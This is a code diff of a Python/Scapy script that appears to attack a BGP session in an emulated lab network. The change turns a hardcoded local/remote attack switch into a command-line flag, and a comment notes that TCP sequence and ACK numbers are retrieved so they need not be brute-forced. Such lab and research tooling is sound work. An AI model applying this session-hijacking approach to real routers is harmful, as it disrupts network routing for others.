@@ -15,8 +15,6 @@ from custom_classes import CustomBGPPathAttribute
 load_contrib("bgp")
 
 
-REMOTE_ATTACK = 1 # 0 => local, 1 => remote
-
 SOURCE_ADDRESS = '9.0.1.2'
 DESTINATION_ADDRESS = '9.0.1.1'
 
@@ -281,16 +279,20 @@ def main():
 	assert choice >= 1
 	assert choice <= 3
 
-	iface = None
-	eth0_mac_address = sys.argv[2]
-	eth1_mac_address = sys.argv[3]
-	r2_eth4_mac_address = sys.argv[4]
-	r2_eth5_mac_address = sys.argv[5]
+	remote_flag = int(sys.argv[2])
+	assert remote_flag >= 0
+	assert remote_flag <= 1
 
-	print 'eth0_mac_address', eth0_mac_address
-	print 'eth1_mac_address', eth1_mac_address
-	print 'r2_eth4_mac_address', r2_eth4_mac_address
-	print 'r2_eth5_mac_address', r2_eth5_mac_address
+	iface = None
+	eth0_mac_address = sys.argv[3]
+	eth1_mac_address = sys.argv[4]
+	r2_eth4_mac_address = sys.argv[5]
+	r2_eth5_mac_address = sys.argv[6]
+
+	#print 'eth0_mac_address', eth0_mac_address
+	#print 'eth1_mac_address', eth1_mac_address
+	#print 'r2_eth4_mac_address', r2_eth4_mac_address
+	#print 'r2_eth5_mac_address', r2_eth5_mac_address
 
 	log('wait for the attacker to retrieve AN and SN\n', 'yellow')
 
@@ -299,7 +301,7 @@ def main():
 	# recupero AN e SN per evitare il bruteforce di AN e SN
 	srcPort, dstPort, ackNum, seqNum, win = retrieve_ports_and_numbers('atk1-eth1', SOURCE_ADDRESS, DESTINATION_ADDRESS)
 
-	if REMOTE_ATTACK == 0:
+	if remote_flag == 0:
 		iface = 'atk1-eth1'
 		src_mac_address = eth1_mac_address
 		dst_mac_address = r2_eth5_mac_address
